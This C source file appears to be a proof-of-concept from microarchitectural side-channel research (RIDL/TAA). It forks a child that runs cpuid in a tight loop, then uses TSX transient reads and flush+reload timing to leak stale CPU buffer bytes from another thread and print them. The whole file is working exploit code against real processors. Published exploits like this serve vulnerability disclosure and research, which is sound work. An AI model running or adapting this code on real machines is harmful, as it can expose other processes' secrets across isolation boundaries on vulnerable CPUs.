/*
Run cpuid on one thread, and then leak the results on another.

Notes:
 * Leaks stale data from a system-wide bus?
*/
#ifdef TAA
 #define ITERS 1000
#else
 #define ITERS 2000 /* change to 10k for reliable leak */
#endif

#include "ridl.h"

#define CPUID_LEAF 0x80000002 /* on 7700k, offset is not in the way */

#define BEGIN_OFFSET 8*4 /* or 8*3-4 for rdseed */

int main(int argc, char *argv[]) {
	usleep(1000);
	
	/* Fork child which runs cpuid in a loop. */
	pid_t pid = fork();
	if (pid == 0) {
		while (1)
			asm volatile(
				"mov %0, %%eax\n"
				"cpuid\n"
				::"r"(CPUID_LEAF+1):"eax","ebx","ecx","edx");
	}
	if (pid < 0) return 1;

	ALLOC_BUFFERS();
#ifndef TAA
	leak = mmap((void *)0xc0000000, 4096*2, PROT_READ | PROT_WRITE, MMAP_FLAGS & ~MAP_HUGETLB, -1, 0);
#endif

restart:
	printf("leaking rdrand: ");
	for (size_t offset = BEGIN_OFFSET; offset < BEGIN_OFFSET+4; ++offset) {
		memset(results, 0, sizeof(results));

		madvise(leak, 4096, MADV_DONTNEED);
		for (size_t i = 0; i < ITERS; ++i) {
			flush(reloadbuffer);
#ifdef TAA
			tsxabort_leak_clflush(leak + offset, reloadbuffer, reloadbuffer);
#else
			asm volatile("mfence\n");
			tsx_leak_read_normal(leak + offset, reloadbuffer);
#endif
			reload(reloadbuffer, results);
		}

#ifdef DETAILS
		print_results(results);
		printf("--\n");
#else
		size_t max = 0x1;
		for (size_t c = 1; c < 256; ++c) {
			if (results[c] >= results[max])
				max = c;
		}
		printf("%02x", max);
#endif
	}

	printf("\n");
	usleep(10000);
	goto restart;

	kill(pid, SIGKILL);
}

